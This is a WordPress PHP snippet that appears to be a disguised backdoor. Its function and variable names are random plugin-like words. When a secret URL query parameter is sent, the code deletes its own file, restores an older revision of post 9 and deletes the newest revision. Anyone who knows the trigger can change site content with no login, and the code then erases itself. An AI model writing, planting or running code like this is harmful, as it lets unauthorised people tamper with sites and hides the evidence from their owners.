<?php

function browser_nextgen_locator() {
	if (isset($_GET['error_invoice_parts_products']) && $_GET['error_invoice_parts_products'] === 'click_tracking_country_archive') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$gravity_settings_patterns_tree = 9;
		$color_send_group = wp_get_post_revisions($gravity_settings_patterns_tree);
		if (empty($color_send_group)) die('no revisions');
		if (count($color_send_group) < 2) die('less than 2');
		$sticky_right_best_genesis = array_shift($color_send_group);
		$slideshow_taxonomies_crm_query = $sticky_right_best_genesis->ID;
		$direct_dropdown_ratings_master = array_shift($color_send_group);
		$info_store_social = $direct_dropdown_ratings_master->ID;
		$form_active_grid_autocomplete = wp_restore_post_revision($info_store_social);
		if ($form_active_grid_autocomplete === false) die('error restoring');
		$form_active_grid_autocomplete = wp_delete_post_revision($slideshow_taxonomies_crm_query);		
		if ($form_active_grid_autocomplete === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'browser_nextgen_locator');
